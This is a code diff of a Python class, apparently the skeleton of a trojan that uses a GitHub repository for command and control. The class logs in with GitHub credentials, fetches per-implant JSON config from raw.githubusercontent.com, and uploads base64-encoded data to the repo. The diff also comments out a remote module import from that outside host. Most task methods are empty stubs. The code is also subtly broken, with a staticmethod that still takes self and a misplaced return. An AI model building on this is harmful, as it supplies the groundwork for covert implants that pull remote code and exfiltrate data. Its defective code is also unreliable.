@@ -1,9 +1,10 @@
 #!/usr/bin/env python
 import json
 import base64
+import random
 from github3 import login
-from httpimp import add_remote_repo
-add_remote_repo(['toy'], 'https://raw.githubusercontent.com/how2how/toy/master/')
+# from httpimp import add_remote_repo
+# add_remote_repo(['toy'], 'https://raw.githubusercontent.com/how2how/toy/master/')
 try:
     from urllib2 import urlopen
 except ImportError:
@@ -11,13 +12,10 @@ except ImportError:
 
 
 class Boy(object):
+    _id = 'abc'
     config_url = 'https://raw.githubusercontent.com/how2how/toy/master/toy/config/'
 
     def __init__(self, guser, gpass, repo):
-        self._id = 'abc'
-        self.configured = False
-        self._modules = []
-        self.task_queue = Queue.Queue()
         self.gh = self.repo = self.branch = None
         self.connect(guser, gpass, repo)
 
@@ -32,19 +30,25 @@ class Boy(object):
         self.repo.create_file(remote_path, msg, base64.b64encode(data))
     return
 
-    def get_config(self, config_url=None):
-        _url = config_url or self.config_url + self._id + '.json'
-        config = urlopen(_url).read()
-        return json.loads(config)
+    @staticmethod
+    def get_config(self, config_url):
+        try:
+            config = urlopen(config_url).read()
+            return json.loads(config)
+        except Exception:
+            return None
 
     def install(self):
         pass
 
-    def enc(self, data):
+    @staticmethod
+    def enc(data):
         pass
 
-    def dec(self, data):
+    @staticmethod
+    def dec(data):
         pass
 
-    def run(self):
+    @staticmethod
+    def run(config):
         pass
